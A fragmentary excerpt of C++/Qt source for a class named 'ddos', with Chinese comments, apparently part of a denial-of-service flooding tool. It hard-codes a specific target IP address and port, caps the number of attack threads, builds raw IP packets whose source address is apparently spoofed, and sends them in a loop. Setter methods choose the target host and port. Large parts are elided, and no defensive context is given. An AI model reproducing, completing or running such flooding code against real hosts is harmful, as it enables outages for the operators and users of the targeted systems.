...
//    //usage(argv[1]);
//    int ErrorCode = 0;
//    char a[] = "148.70.205.134";
//    DestIP = a;//取得目标主机IP
//    port = 8009;//取得目标端口号
//    maxthread = (maxthread > 100) ? 100 : 80;
...
//        ipheader.sourceIP = htonl(FakeIpHost + SendSEQ);
        ...
        memcpy(sendBuf, &ipheader, sizeof(ipheader));
        qDebug()<<sendto(sock, sendBuf, dataSize, 0, (struct sockaddr*)&sockAddr, sizeof(sockAddr));
...
void ddos::getdIP(char *ip)
{
    this->DestIP=ip;
}

void ddos::getport(int port)
{
    this->port=port;
}
